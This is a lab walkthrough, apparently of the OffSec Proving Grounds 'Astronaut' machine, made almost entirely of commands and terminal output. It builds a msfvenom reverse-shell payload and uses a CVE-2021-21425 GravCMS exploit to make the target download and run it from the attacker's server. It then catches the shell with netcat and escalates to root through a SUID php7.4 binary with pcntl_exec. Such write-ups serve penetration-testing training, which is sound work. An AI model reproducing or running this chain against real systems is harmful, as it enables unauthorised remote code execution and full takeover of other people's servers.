参考资料：  
[https://github.com/pika5164/Offsec_Proving_Grounds/blob/master/PG_Practice/Linux/Astronaut.md](https://github.com/pika5164/Offsec_Proving_Grounds/blob/master/PG_Practice/Linux/Astronaut.md)
 
192.168.218.12
 
漏洞利用：  
[https://pentest.blog/unexpected-journey-7-gravcms-unauthenticated-arbitrary-yaml-write-update-leads-to-code-execution/](https://pentest.blog/unexpected-journey-7-gravcms-unauthenticated-arbitrary-yaml-write-update-leads-to-code-execution/)
   

msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.45.192 LPORT=9001 -f elf \> shell_9001
   

python3 exploit.py -c "wget 192.168.45.192/shell_9001" -t [http://192.168.218.12/grav-admin](http://192.168.218.12/grav-admin)
   

python3 exploit.py -c "chmod +x shell_9001; ./shell_9001" -t [http://192.168.218.12/grav-admin](http://192.168.218.12/grav-admin)
   

rlwrap -cAr nc -nvlp9001  
rlwrap -cAr nc -nvlp 9001
   

┌──(kali㉿kali)-[~/Desktop/pg03/Astronaut/CVE-2021-21425]  
└─$ python3 exploit.py -c "wget 192.168.45.192/shell_9001" -t [http://192.168.218.12/grav-admin](http://192.168.218.12/grav-admin)  
/home/kali/Desktop/pg03/Astronaut/CVE-2021-21425/exploit.py:25: DeprecationWarning: Call to deprecated method findAll. (Replaced by find_all) -- Deprecated since version 4.0.0.  
a = str(soup.findAll('input')[3])  
[*] Creating File  
Scheduled task created for file creation, wait one minute
 
[*] Running file  
Scheduled task created for command, wait one minute  
┌──(kali㉿kali)-[~/Desktop/pg03/Astronaut/CVE-2021-21425]  
└─$ python3 exploit.py -c "chmod +x shell_9001; ./shell_9001" -t [http://192.168.218.12/grav-admin](http://192.168.218.12/grav-admin)  
/home/kali/Desktop/pg03/Astronaut/CVE-2021-21425/exploit.py:25: DeprecationWarning: Call to deprecated method findAll. (Replaced by find_all) -- Deprecated since version 4.0.0.  
a = str(soup.findAll('input')[3])  
[*] Creating File  
Scheduled task created for file creation, wait one minute  
[*] Running file  
Scheduled task created for command, wait one minute  
Exploit completed  
┌──(kali㉿kali)-[~/Desktop/pg03/Astronaut/CVE-2021-21425]  
└─$
   

┌──(kali㉿kali)-[~/Desktop/pg03/Astronaut/CVE-2021-21425]  
└─$ python -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 ([http://0.0.0.0:80/](http://0.0.0.0:80/)) ...  
192.168.218.12 - - [21/Nov/2025 08:42:02] "GET /shell_9001 HTTP/1.1" 200 -
         

Exploit completed   ┌──(kali㉿kali)-[~/Desktop/pg03/Astronaut/CVE-2021-21425]  
└─$  
   

webserver-configs  
python3 -c 'import pty; pty.spawn("/bin/bash")'  
www-data@gravity:/var/www/html/grav-admin$ ls  
ls  
CHANGELOG.md SECURITY.md composer.json now.json user  
CODE_OF_CONDUCT.md assets composer.lock robots.txt vendor  
CONTRIBUTING.md backup images shell_9001 webserver-configs  
LICENSE.txt bin index.php system  
README.md cache logs tmp  
www-data@gravity:/var/www/html/grav-admin$ find / -perm -u=s -type f 2\>/dev/null  
\<l/grav-admin$ find / -perm -u=s -type f 2\>/dev/null  
/snap/core20/1852/usr/bin/chfn  
/snap/core20/1852/usr/bin/chsh  
/snap/core20/1852/usr/bin/gpasswd  
/snap/core20/1852/usr/bin/mount  
/snap/core20/1852/usr/bin/newgrp  
/snap/core20/1852/usr/bin/passwd  
/snap/core20/1852/usr/bin/su  
/snap/core20/1852/usr/bin/sudo  
/snap/core20/1852/usr/bin/umount  
/snap/core20/1852/usr/lib/dbus-1.0/dbus-daemon-launch-helper  
/snap/core20/1852/usr/lib/openssh/ssh-keysign  
/snap/core20/1611/usr/bin/chfn  
/snap/core20/1611/usr/bin/chsh  
/snap/core20/1611/usr/bin/gpasswd  
/snap/core20/1611/usr/bin/mount  
/snap/core20/1611/usr/bin/newgrp  
/snap/core20/1611/usr/bin/passwd  
/snap/core20/1611/usr/bin/su  
/snap/core20/1611/usr/bin/sudo  
/snap/core20/1611/usr/bin/umount  
/snap/core20/1611/usr/lib/dbus-1.0/dbus-daemon-launch-helper  
/snap/core20/1611/usr/lib/openssh/ssh-keysign  
/snap/snapd/18596/usr/lib/snapd/snap-confine  
/usr/lib/dbus-1.0/dbus-daemon-launch-helper  
/usr/lib/eject/dmcrypt-get-device  
/usr/lib/snapd/snap-confine  
/usr/lib/openssh/ssh-keysign  
/usr/lib/policykit-1/polkit-agent-helper-1  
/usr/bin/chsh  
/usr/bin/at  
/usr/bin/su  
/usr/bin/fusermount  
/usr/bin/chfn  
/usr/bin/umount  
/usr/bin/sudo  
/usr/bin/passwd  
/usr/bin/newgrp  
/usr/bin/mount  
/usr/bin/php7.4  
/usr/bin/gpasswd  
www-data@gravity:/var/www/html/grav-admin$ install -m =xs $(which php7.4) .  
install -m =xs $(which php7.4) .  
www-data@gravity:/var/www/html/grav-admin$ CMD="/bin/sh"  
CMD="/bin/sh"  
www-data@gravity:/var/www/html/grav-admin$ /usr/bin/php7.4 -r "pcntl_exec('/bin/sh', ['-p']);"  
\</usr/bin/php7.4 -r "pcntl_exec('/bin/sh', ['-p']);"  
# whoami  
whoami  
root  
# cd root  
cd root  
/bin/sh: 2: cd: can't cd to root  
# cd /root  
cd /root  
# ls  
ls  
flag1.txt proof.txt snap  
# cat proof.txt  
cat proof.txt  
3413287724b943f2c8c261cbff299ac0  
#